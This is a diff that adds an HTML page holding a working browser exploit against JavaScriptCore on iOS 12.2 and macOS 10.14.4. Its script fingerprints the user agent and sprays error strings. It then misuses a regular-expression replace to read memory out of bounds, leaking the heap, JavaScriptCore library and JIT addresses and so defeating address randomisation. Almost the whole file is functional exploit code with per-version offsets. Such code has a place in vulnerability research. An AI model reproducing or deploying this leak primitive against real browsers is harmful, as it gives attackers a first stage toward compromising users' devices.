@@ -1,0 +1,332 @@
+	<html>
+	<head>
+	</head>
+	<body onload="main()">
+    <script>
+
+//////////// config
+
+let PER_ITEM = 0x10000;
+let DEBUG = true; // for debug print
+
+var TARGET_VERSION='';
+var DEVICE='';
+
+var jsc_text_base_addr = 0;
+var jsc_data_base_addr = 0;
+var heap_from_fastMalloc = 0;
+var jit_addr = 0;
+
+var offset_table = {
+	'osx10.14.4': {
+		jsc_text_csstring_offset: 0xDBDF1D, // __cstring:0000000000DBDF1D aTostringRadixA db 'toString() radix argument must be between 2 and 36',0
+		jsc_data_offset: 0x7fff8ba509f8 - 0x7fff8ba3a000 // 0x7fff8ba509f8: 0x00007fff36ef4c30 JavaScriptCore`JSC::JITCodeWithCodeRef::~JITCodeWithCodeRef()
+
+	},
+	'ios12.2': {
+		jsc_text_csstring_offset: 0x0000000188BF84FA - 0x0000000187F9C000, // __cstring:0000000188BF84FA aTostringRadixA DCB "toString() radix argument must be between 2 and 36",0
+		jsc_data_offset: 0x1B1B7FDB8 - 0x1B1B68900, // got: 0x1B1B68910
+		// * how to know?
+		// 0x241c2fdb8: 0x00000002187d28c4 JavaScriptCore`JSC::JITCodeWithCodeRef::~JITCodeWithCodeRef()
+		// search "emitMathICSlow" in .data segment (using IDA)
+		// check out the addresses in lldb (using Xcode)
+		
+	}
+};
+
+/////////// utils
+
+String.prototype.rjust = function( width, padding ) {
+	padding = padding || " ";
+	padding = padding.substr( 0, 1 );
+	if( this.length < width )
+		return padding.repeat( width - this.length ) + this;
+	else
+		return this;
+}
+
+print = (x, flag=true) => {
+    if (DEBUG){
+		document.write('<div style="font-family: monaco;">');
+		if (flag){
+			document.write('' + x.replace(/\n/, '<br>'));
+		}
+		else{
+			document.write('' + x.replace(/\n/, ' '));			
+		}
+		document.write('</div>');
+	}
+};
+
+var DataView64 = function (buffer) {
+    var dv = new DataView(buffer);
+    this.buffer = buffer;
+    this.getUint32 = function (offset) {
+        return dv.getUint32(offset, true);
+    };
+    this.setUint32 = function (offset, value) {
+        dv.setUint32(offset, value, true);
+    };
+    this.getUint64 = function (offset) {
+        return this.getUint32(offset) + this.getUint32(offset + 4) * 0x100000000;
+    };
+    this.setUint64 = function (offset, value) {
+        this.setUint32(offset, value);
+        this.setUint32(offset + 4, Math.floor(value / 0x100000000));
+    };
+};
+
+var buf = new ArrayBuffer(8);
+var dv = new DataView64(buf);
+var ui8 = new Uint8Array(buf);
+
+function s2a(s) {
+    for (let i = 0; i < 8; i++)
+		ui8[i] = s.charCodeAt(i);
+
+    return ui8;
+}
+
+function s2i(s) {
+    s2a(s);
+    return dv.getUint64(0);
+}
+
+function u64(s, offset) {
+	let t = s.substring(offset, offset+8);
+	return s2i(t);
+}
+
+function u32(s, offset) {
+	let t = s.substring(offset, offset+4);
+	return s2i(t);
+}
+
+function hex(x) {
+    if (x === undefined) return 'undefined';
+    if (x < 0){
+		return `-${hex(-x)}`;
+	}
+    return `0x${x.toString(16).rjust(16,'0')}`;
+}
+
+///////////// priavte function
+
+let _find_duplicate = (s) => {
+	// dumb algorithm
+
+	var len = s.length;
+
+	for(var k=0;k<len;k++){
+		var lastchar = s[len-1 -k];
+		s_offset = -1;
+		for(var i=1;i<len-k;i++){
+			if(lastchar == s[len-1 -k -i]){
+				s_offset = len-1-i;
+				break;
+			}
+		}
+		if (s_offset != -1){
+			var e_offset = len-k;
+			return [s_offset, e_offset];
+		}
+	}
+
+	return [-1, -1];
+};
+
+let _escape_for_regexp = (s) => {
+	return s.replace(/[-[\]{}()*+!<=:?.\/\\^$|#\s,]/g, '\\$&');
+}
+
+let _leak = (x) => {
+	let ret='';
+
+	dup = _find_duplicate(x);
+	var s_offset = dup[0];
+	var e_offset = dup[1];
+
+	if (s_offset == -1){
+		alert('not found!');
+		exit();
+	}
+
+	var r_str1 = _escape_for_regexp(x[s_offset]);
+	var r_str2 = _escape_for_regexp(x.substring(s_offset+1, e_offset-1));		
+	
+	var r_str = "(?:((" + r_str1 + ')' + r_str2 + "\\2[^]{1," + PER_ITEM + "}))";
+
+	// alert(r_str);
+	
+	var r = new RegExp(r_str);
+	var s = x.substring(s_offset, e_offset);
+
+	result = s.replace(r, (match) => {
+		ret = match;
+	});
+
+	// var dup_length = e_offset-s_offset;
+	// ret = ret.substring(dup_length, dup_length+PER_ITEM);
+	
+	return ret;
+};
+
+let _dump = (l, align, offset, sz) => {
+	print('\n\n\n\n');
+	print('--------------------------------------------------------');
+	print( 'align: '+align+'\n'+'string: '+l.substring(0, align) );
+	for(var i=align;i<sz;i+=0x10){
+		// print( hex(u64(l, offset+i)) + '\t' + hex(u64(l, offset+i + 8)) + '\t' + u64(l, offset+i));
+		print( hex(u64(l, offset+i)) + '\t' + hex(u64(l, offset+i + 8)) + '\t' + l.substring(offset+i, offset+i+8) , false);
+	}
+	print('--------------------------------------------------------');	
+	print('\n\n\n\n')
+};
+
+function leak_heap_from_fastMalloc(target_str, align){
+	var l = _leak(target_str);
+
+	// find fastMalloc heap addr
+	var t_low = u32(l, align+8);
+	var t_high = u32(l, align+8+4);
+
+	heap_from_fastMalloc = t_high * 0x100000000 + t_low;
+}
+
+function leak_jsc(target_str, align){
+	// if(jsc_text_base_addr != 0){
+	// 	return;
+	// }
+
+	var l = _leak(target_str);
+
+	// find jsc .text start and .data start
+	var cnt = 0;
+	for(var i=align;i<PER_ITEM;i+=8){
+		cnt += 1;
+		var t_low = u32(l, i);
+		var t_high = u32(l, i+4);
+
+		switch (TARGET_VERSION){
+		case 'osx10.14.4':
+			// __cstring:0000000000DBDF1D aTostringRadixA db 'toString() radix argument must be between 2 and 36',0		
+			if ( jsc_text_base_addr == 0 &&
+				 ( (0xfff & t_low) == 0xf1d ) &&
+				 ( (0xffff & t_high) == 0x7fff )
+			   ){
+				jsc_text_base_addr = t_high * 0x100000000 + t_low;
+			}
+
+			// 0x7fff8ba509f8: 0x00007fff36ef4c30 JavaScriptCore`JSC::JITCodeWithCodeRef::~JITCodeWithCodeRef()
+			else if ( jsc_data_base_addr == 0 &&
+					  ( (0xfff & t_low) == 0x9f8 ) &&
+					  ( t_high == 0x7fff )
+					){
+				jsc_data_base_addr = t_high * 0x100000000 + t_low;
+
+				if(i+0x18 < PER_ITEM){
+					var t_low = u32(l, i+0x10);
+					var t_high = u32(l, i+0x14);
+					jit_addr = t_high * 0x100000000 + t_low;
+				}
+			}
+			break;
+
+		case 'ios12.2':
+			// __cstring:0000000188BF84FA aTostringRadixA DCB "toString() radix argument must be between 2 and 36",0			
+			if ( jsc_text_base_addr == 0 &&
+				 ( (0xfff & t_low) == 0x4fa ) &&
+				 ( t_high == 0x1 || t_high == 0x2 )
+			   ){
+				jsc_text_base_addr = t_high * 0x100000000 + t_low;
+			}
+
+			// 0x241c2fdb8: 0x00000002187d28c4 JavaScriptCore`JSC::JITCodeWithCodeRef::~JITCodeWithCodeRef()
+			if ( jsc_data_base_addr == 0 &&
+				 ( (0xfff & t_low) == 0xdb8 ) &&
+				 // ( t_high == 0x1 || t_high == 0x2 )
+				 ( t_high == 0x2 )				 
+			   ){
+				jsc_data_base_addr = t_high * 0x100000000 + t_low;
+
+				if(i+0x18 < PER_ITEM){
+					var t_low = u32(l, i+0x10);
+					var t_high = u32(l, i+0x14);
+					jit_addr = t_high * 0x100000000 + t_low;
+				}
+			}
+			break;
+		}
+	}
+	
+	// _dump(l, align, 0, 0x1000 );
+}
+
+function leak_dump(target_str, align){
+	var l = _leak(target_str);
+
+	_dump(l, align, 0, 0x1000 );
+}
+
+function check_version()
+{
+	var ua = navigator.userAgent;
+	
+	if ( ua.includes("iPhone OS 12_2") ){
+		TARGET_VERSION = "ios12.2";
+		DEVICE='ios';
+	}
+	else if ( ua.includes("Mac OS X 10_14_4") ){
+		TARGET_VERSION = "osx10.14.4";
+		DEVICE='osx';
+	}
+
+}
+
+// length is important!
+let l2 = "NN";
+let l4 = "MabM";
+let l8 = "LabcdefL";
+let l16 = "OabcdefghijklmnO";
+
+function show() {
+	// spray error msg
+	for(var i=0;i<0x1000*0x10;i++){
+    	try{(42).toString(37);} catch(e){};
+	}
+
+	// leak
+	leak_heap_from_fastMalloc(l2, 4);
+	
+	leak_jsc(l2, 4);
+	leak_jsc(l4, 4);
+	leak_jsc(l8, 8+4);
+	leak_jsc(l16, 4);
+
+	// adjust
+	heap_from_fastMalloc -= 4;
+	jsc_text_base_addr -= offset_table[TARGET_VERSION].jsc_text_csstring_offset;
+	jsc_data_base_addr -= offset_table[TARGET_VERSION].jsc_data_offset;
+
+	// result
+	print('Heap addr from fastMalloc(): ' + hex(heap_from_fastMalloc));
+	
+	print('JavaScriptCore .text base addr: ' + hex(jsc_text_base_addr));
+	print('JavaScriptCore .data base addr: ' + hex(jsc_data_base_addr));
+	print('JIT addr: ' + hex(jit_addr));
+
+	print('');
+
+	leak_dump(l2, 4);
+}
+
+function main(){
+	check_version();
+	show();
+}
+
+</script>
+	</body>
+	</html>
+
+
